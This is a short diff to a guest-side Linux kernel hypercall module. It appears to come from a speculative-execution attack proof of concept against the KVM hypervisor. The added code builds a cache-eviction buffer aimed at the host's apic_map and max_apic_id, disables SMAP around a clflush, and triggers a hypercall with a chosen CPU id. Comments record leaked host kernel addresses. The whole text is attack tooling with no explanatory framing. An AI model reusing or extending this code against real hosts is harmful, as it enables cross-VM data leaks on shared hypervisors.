@@ -113,6 +113,9 @@ static ssize_t send_ipi_write(struct file *file, const char __user *buff, size_t
   return time;
 }
 
+#define EVSIZE 1024
+__attribute__((aligned(0x1000))) volatile char evbuf[EVSIZE * 0x1000];
+
 static ssize_t sched_yield_write(struct file *file, const char __user *buff, size_t len, loff_t *off) {
   struct sched_yield_hypercall opts;
 
@@ -134,6 +137,16 @@ static ssize_t sched_yield_write(struct file *file, const char __user *buff, siz
   disable_smap();
   __asm__ volatile("clflush (%0)\nmfence" ::"r"(opts.ptr));
   enable_smap();
+
+  int evsize = opts.evict_amount < EVSIZE ? opts.evict_amount : EVSIZE;
+
+  // [1581417.520428] &map->max_apic_id = ffffa035dd2ae014
+  //                                 \--> pa = 0x2dd2ae014
+  // [1581417.520430] &kvm->arch.apic_map = ffffb1b08d9fe358
+  for (int i = 0; i < evsize; i++) {
+    evbuf[i*0x1000+0x14]; // &Evict map->max_apic_id
+    evbuf[i*0x1000+0x358]; // Evict &map
+  }
 
   vmcall1(type, opts.speculated_cpu_id);
 
@@ -213,6 +226,9 @@ static int __init hypercall_main(void) {
     pr_alert("hypercall: Error:Could not initialize /proc/%s/%s\n", procfs_root_name, procfs_self_ipi_name);
     return -ENOMEM;
   }
+
+  memset((void *)evbuf, 0x97, sizeof(evbuf));
+  pr_info("hypercall: initialized `evbuf` @%px to 0x97", evbuf);
 
   pr_info("hypercall: procfs entries created\n");
 
